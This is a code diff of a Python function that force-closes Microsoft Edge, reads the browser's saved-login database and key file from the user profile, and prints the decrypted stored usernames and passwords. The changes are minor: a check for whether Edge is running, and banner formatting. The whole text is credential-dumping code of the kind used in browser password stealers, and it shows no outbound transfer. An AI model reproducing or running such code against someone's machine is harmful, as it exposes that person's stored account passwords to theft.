@@ -8,8 +8,9 @@ from utils.ansiColors import BOLD_RED, BOLD_GREEN, GRAY, RESET
 
 def getPasswords():
     try:
-        os.system("taskkill /F /IM msedge.exe")
-        os.system('cls' if os.name == 'nt' else 'clear')
+        if os.system("tasklist | findstr msedge.exe") == 0:
+            os.system("taskkill /F /IM msedge.exe")
+            os.system('cls' if os.name == 'nt' else 'clear')
 
         dbPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Default\Login Data"
         keyPath = os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data\Local State"
@@ -27,9 +28,9 @@ def getPasswords():
         cursor = conn.cursor()
         cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
 
-        print("=====================================")
-        print("      ** DECRYPTED CREDENTIALS **    ")
-        print("=====================================")
+        print("=======================================")
+        print("      ** DECRYPTED CREDENTIALS **      ")
+        print("=======================================")
 
         outputs = []
 
@@ -52,7 +53,6 @@ def getPasswords():
 
         for line in outputs[:-1]:
             print(line)
-        print("=====================================")
 
         conn.close()
     except Exception as e:
